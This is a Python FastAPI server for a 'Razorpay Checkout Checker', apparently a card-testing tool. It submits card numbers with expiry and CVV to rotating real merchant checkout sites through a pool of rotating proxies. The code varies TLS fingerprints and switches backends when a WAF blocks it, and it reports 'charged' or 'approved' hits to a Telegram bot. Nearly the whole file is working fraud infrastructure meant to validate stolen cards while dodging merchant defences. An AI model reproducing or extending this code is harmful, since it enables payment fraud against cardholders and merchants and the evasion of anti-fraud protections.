#!/usr/bin/env python3
"""API server — auto-rotating sites + proxies for Razorpay checkouts."""

import asyncio, re, json, random, sys, os, time
try:
    import resource
except ImportError:
    resource = None
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse
from contextlib import asynccontextmanager
from typing import Optional

from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel

class _UTF8JSONResponse(JSONResponse):
    def render(self, content) -> bytes:
        return json.dumps(content, ensure_ascii=False, allow_nan=False,
                          separators=(",", ":")).encode("utf-8")

JSONResponse = _UTF8JSONResponse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ja4_engine import get_diversity_engine
from session_cache import get_session_cache
import tg_bot
import proxy_manager
import rate_limiter
import backend_router
import live_proxy_store
import site_rotator
import proxy_auto_load

_ja4_engine = get_diversity_engine()
_session_cache = get_session_cache()
_ja4_limiter = rate_limiter.get_ja4_limiter()
_aimd = rate_limiter.get_aimd()

MAX_CONCURRENT = int(os.environ.get('MAX_CONCURRENT', '1000'))
_static_gate = asyncio.Semaphore(MAX_CONCURRENT)
_aimd_active: int = 0
_aimd_cond = asyncio.Condition()

async def _aimd_acquire():
    global _aimd_active
    async with _aimd_cond:
        while _aimd_active >= _aimd.current_max:
            await _aimd_cond.wait()
        _aimd_active += 1

def _aimd_release():
    global _aimd_active
    _aimd_active -= 1

class _AIMDGate:
    async def __aenter__(self):
        await _static_gate.acquire()
        try:
            await _aimd_acquire()
        except Exception:
            _static_gate.release()
            raise
        return self

    async def __aexit__(self, *args):
        _aimd_release()
        _static_gate.release()
        async with _aimd_cond:
            _aimd_cond.notify(1)

    def locked(self) -> bool:
        return _static_gate.locked()

aimd_gate = _AIMDGate()

MIN_PROXY_RATIO = 3
_proxy_alert_cooldown: float = 0.0
_pool_monitor_task: Optional[asyncio.Task] = None

async def _check_proxy_pool_health():
    global _proxy_alert_cooldown
    while True:
        await asyncio.sleep(60)
        try:
            stats = proxy_manager.get_pool_stats()
            live = stats.get('live', 0)
            total = stats.get('total', 0)
            max_supported = live * MIN_PROXY_RATIO
            if max_supported < _aimd.current_max and time.monotonic() > _proxy_alert_cooldown:
                msg = (f"⚠️ Proxy pool LOW: {live} live can support "
                       f"~{max_supported} concurrent (need {_aimd.current_max})\n"
                       f"Pool: {live}/{total} live")
                try:
                    await tg_bot.send_admin_alert(msg)
                except Exception:
                    pass
                _proxy_alert_cooldown = time.monotonic() + 300
        except Exception:
            pass

if resource is not None:
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except Exception:
        try:
            soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < 16384:
                print(f"[api] WARNING: fd limit is {soft}", file=sys.stderr)
        except Exception:
            pass

@asynccontextmanager
async def _lifespan(app: FastAPI):
    try:
        await tg_bot.start_bot()
        print("[api] Telegram bot started", file=sys.stderr)
    except Exception as e:
        print(f"[api] WARNING: Telegram bot failed: {e}", file=sys.stderr)

    try:
        proxy_auto_load.load_once()
        proxy_auto_load.start_background_loader()
    except Exception as e:
        print(f"[api] WARNING: proxy auto-load failed: {e}", file=sys.stderr)

    try:
        site_rotator.get_all()
        print(f"[api] sites loaded: {site_rotator.count()}", file=sys.stderr)
    except Exception as e:
        print(f"[api] WARNING: site load failed: {e}", file=sys.stderr)

    global _pool_monitor_task
    _pool_monitor_task = asyncio.create_task(_check_proxy_pool_health())

    yield

    if _pool_monitor_task is not None:
        _pool_monitor_task.cancel()
        try:
            await _pool_monitor_task
        except asyncio.CancelledError:
            pass
        _pool_monitor_task = None
    try:
        await tg_bot.stop_bot()
    except Exception:
        pass

app = FastAPI(title='Payment Checker API', version='2.6.0', lifespan=_lifespan,
              default_response_class=_UTF8JSONResponse)

def _safe_json(resp):
    content = resp.content
    if len(content) >= 2 and content[:2] == b'\x1f\x8b':
        import gzip
        try:
            content = gzip.decompress(content)
        except Exception:
            pass
    elif len(content) >= 1 and content[0] == 0xce:
        try:
            import brotli
            content = brotli.decompress(content)
        except Exception:
            pass
    try:
        return json.loads(content)
    except (UnicodeDecodeError, json.JSONDecodeError):
        pass
    for enc in ['latin-1', 'windows-1252', 'iso-8859-1']:
        try:
            return json.loads(content.decode(enc))
        except (UnicodeDecodeError, json.JSONDecodeError):
            continue
    try:
        return json.loads(content.decode('utf-8', errors='replace'))
    except json.JSONDecodeError:
        body_preview = content[:500].decode('utf-8', errors='replace')
        hex_preview = content[:32].hex(' ')
        raise ValueError(f"Non-JSON response (HTTP {resp.status_code}) hex=[{hex_preview}] body=[{body_preview}]")

def _safe_text(resp):
    content = resp.content
    if len(content) >= 2 and content[:2] == b'\x1f\x8b':
        import gzip
        try:
            content = gzip.decompress(content)
        except Exception:
            pass
    try:
        return content.decode('utf-8')
    except UnicodeDecodeError:
        for enc in ['latin-1', 'windows-1252', 'iso-8859-1']:
            try:
                return content.decode(enc)
            except UnicodeDecodeError:
                continue
        return content.decode('utf-8', errors='replace')

@app.get('/')
async def api_docs():
    return {
        "api": "Razorpay Checkout Checker",
        "version": "2.6.0",
        "auto_features": {
            "proxies": f"from proxies.txt, auto-reload every {os.environ.get('PROXY_RELOAD_INTERVAL', '3600')}s",
            "sites": f"from sites.txt, round-robin rotate on every call",
        },
        "endpoints": {
            "/razorpay": "cc required, site+proxy optional",
            "/sites": "site rotation info",
            "/sites/next": "preview next site",
            "/health": "health",
            "/pool-status": "proxy pool",
        },
    }

@app.get('/sites')
async def sites_info():
    return {
        "status": "ok",
        "count": site_rotator.count(),
        "file": next((f for f in ["sites.txt", "site.txt"] if os.path.exists(f)), None),
        "preview": site_rotator.get_all()[:5],
    }

@app.get('/sites/next')
async def sites_next():
    s = site_rotator.get_next_site()
    if not s:
        raise HTTPException(503, "no sites loaded — add sites.txt")
    return {"status": "ok", "site": s}

@app.get('/razorpay')
async def api_razorpay(
    cc: str = Query(..., description='Card: number|MM|YYYY|CVV'),
    site: str = Query(None, description='Razorpay URL (auto-rotated if omitted)'),
    proxy: str = Query(None, description='Proxy (optional if key provided)'),
    amount: int = Query(None, description='Amount in paise (100 = ₹1)'),
    region: str = Query('IN', description='Geo region'),
    key: str = Query(None, description='API key for auto proxy'),
):
    import razorpay as rzp

    max_retries = 3 if (key and proxy_manager.validate_key(key)) else 1
    last_error_msg = "Unknown Error"
    force_primp = False

    if aimd_gate.locked():
        return JSONResponse(
            status_code=503,
            content={"status": "error", "message": "server_overloaded",
                     "retry_after": 5},
            headers={"Retry-After": "5"},
        )

    await asyncio.sleep(random.uniform(0.0, 2.0))

    async with aimd_gate:
        for api_attempt in range(max_retries):
            call_site = site
            if not call_site:
                call_site = site_rotator.get_next_site()
                if not call_site:
                    return JSONResponse(
                        status_code=503,
                        content={"status": "error",
                                 "message": "no_sites — add sites.txt or pass ?site="},
                        headers={"Retry-After": "30"},
                    )

            if key and proxy_manager.validate_key(key):
                pool_entry = proxy_manager.get_random_live_proxy()
                if not pool_entry:
                    return JSONResponse(
                        status_code=503,
                        content={"status": "error", "message": "no_live_proxies",
                                 "pool_stats": proxy_manager.get_pool_stats()},
                        headers={"Retry-After": "30"},
                    )
                current_proxy = pool_entry["full_url"]
            else:
                if not cc or not proxy:
                    raise HTTPException(400, "cc and proxy are required "
                                             "(or provide ?key= for auto proxy)")
                current_proxy = proxy

            proxy_key = proxy_manager.get_proxy_ip_port(current_proxy)

            try:
                amount_paise = amount if amount else rzp.DEFAULT_AMOUNT_PAISE
                result = await rzp.run_razorpay_async(
                    cc, call_site, current_proxy, verbose=False,
                    amount_paise=amount_paise, region=region,
                    backend='primp' if force_primp else 'auto',
                )

                status = result.get('status')
                msg = result.get('message', '').lower()

                is_network_err = status == 'error' and any(
                    x in msg for x in ('timeout', 'curl', 'proxy', 'connection',
                                       '502', '503'))
                is_waf_err = status == 'error' and ('403' in msg or 'forbidden' in msg)

                if is_network_err or is_waf_err:
                    _aimd.record_outcome(True)
                    if proxy_manager._record_proxy_failure(proxy_key):
                        proxy_manager.remove_from_pool(proxy_key)
                    if is_waf_err:
                        try:
                            tg_bot.increment_stat('waf_403')
                        except Exception:
                            pass
                    if api_attempt < max_retries - 1:
                        last_error_msg = msg
                        if is_waf_err:
                            force_primp = True
                        await asyncio.sleep(0.5)
                        continue
                else:
                    proxy_manager._clear_proxy_failures(proxy_key)
                    proxy_manager.mark_proxy_used(proxy_key)
                    if status in ('charged', 'approved'):
                        rzp.notify_hit(result, call_site)

                tg_bot.increment_stat('total_checkouts')
                is_waf_err = result.get('status') == 'error' and (
                    '403' in result.get('message', '') or
                    '406' in result.get('message', '') or
                    'waf' in result.get('reason', '').lower()
                )
                _aimd.record_outcome(is_waf_err)
                if random.random() < 0.05:
                    new_max, action = _aimd.adapt()
                    if action not in ('hold_steady', 'insufficient_data'):
                        print(f'[aimd] {action} | new_max={new_max} | '
                              f'error_rate={_aimd.error_rate:.2%}', file=sys.stderr)
                return result

            except Exception as e:
                err_str = str(e)
                _aimd.record_outcome(True)
                if proxy_manager._record_proxy_failure(proxy_key):
                    proxy_manager.remove_from_pool(proxy_key)
                if api_attempt < max_retries - 1:
                    last_error_msg = err_str
                    await asyncio.sleep(0.5)
                    continue
                return JSONResponse(
                    status_code=500,
                    content={"status": "error", "message": err_str[:200]},
                )

        _aimd.record_outcome(True)
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "message": f"Failed after {max_retries} proxy attempts. "
                           f"Last error: {last_error_msg}",
            },
        )

@app.get('/stats')
async def api_stats():
    try:
        return {"status": "ok", "stats": tg_bot.get_stats()}
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}

@app.get('/health')
async def health():
    try:
        fd_count = len(os.listdir('/proc/self/fd'))
        fd_soft, fd_hard = (resource.getrlimit(resource.RLIMIT_NOFILE) if resource else (-1, -1))
    except Exception:
        fd_count = -1
        fd_soft = fd_hard = -1
    return {
        "status": "ok",
        "version": "2.6.0",
        "concurrency": {"max": MAX_CONCURRENT, "gate_locked": aimd_gate.locked()},
        "proxy_failures": {"tracked_hosts": sum(1 for v in proxy_manager._load_failure_counts().values() if v >= proxy_manager.FAILURE_THRESHOLD)},
        "ja4_engine": {
            "active_configs": _ja4_engine.active_count,
            "targets": _ja4_engine.targets,
            "estimated_diversity": _ja4_engine.estimated_diversity,
        },
        "file_descriptors": {
            "current": fd_count,
            "soft_limit": fd_soft,
            "hard_limit": fd_hard,
        },
        "session_cache": _session_cache.stats,
        "backend_router": backend_router.get_backend_stats(),
        "proxy_store": live_proxy_store.get_stats(),
        "sites": site_rotator.count(),
    }

class ProxyCheckRequest(BaseModel):
    proxies: list[str]

@app.get('/pool-status')
async def pool_status():
    stats = proxy_manager.get_pool_stats()
    cooldowns = proxy_manager.get_cooldown_list()
    cd_list = [
        {"proxy": k, "until": v.get("until"), "reason": v.get("reason", "waf_403")}
        for k, v in sorted(cooldowns.items(), key=lambda x: x[1].get("until", 0))
    ]
    site_cds = proxy_manager.get_site_cooldown_list()
    site_list = [
        {"site": k, "until": v.get("until"), "reason": v.get("reason", "site_error")}
        for k, v in sorted(site_cds.items(), key=lambda x: x[1].get("until", 0))
    ]
    return {
        "status": "ok",
        "total": stats.get("total", 0),
        "live": stats.get("live", 0),
        "cooldown": stats.get("cooldown", 0),
        "cooldown_list": cd_list,
        "site_cooldown": len(site_list),
        "site_cooldown_list": site_list,
    }

@app.get('/pool-list')
async def pool_list():
    live = proxy_manager.get_all_live_proxies()
    return {
        "status": "ok",
        "live": len(live),
        "proxies": [e.get("full_url") for e in live],
    }

@app.post('/check-proxy')
async def check_proxy(req: ProxyCheckRequest):
    if not req.proxies:
        raise HTTPException(400, "proxies list is required")
    unique = list(dict.fromkeys(req.proxies))
    results = await proxy_manager.bulk_check_proxies(unique)
    live_count = sum(1 for r in results if r.get('status') == 'live')
    blocked = sum(1 for r in results if r.get('status') == 'blocked')
    dead = sum(1 for r in results if r.get('status') == 'dead')
    errors = sum(1 for r in results if r.get('status') not in ('live', 'blocked', 'dead'))
    return {
        "total": len(results),
        "live": live_count,
        "blocked": blocked,
        "dead": dead,
        "errors": errors,
        "results": results,
    }

if __name__ == '__main__':
    import uvicorn
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--port', type=int, default=9000)
    p.add_argument('--host', default='0.0.0.0')
    args = p.parse_args()
    print(f"\n  FastAPI server: http://{args.host}:{args.port}\n"
          f"  Max concurrent: {MAX_CONCURRENT}\n")
    uvicorn.run(app, host=args.host, port=args.port, workers=1)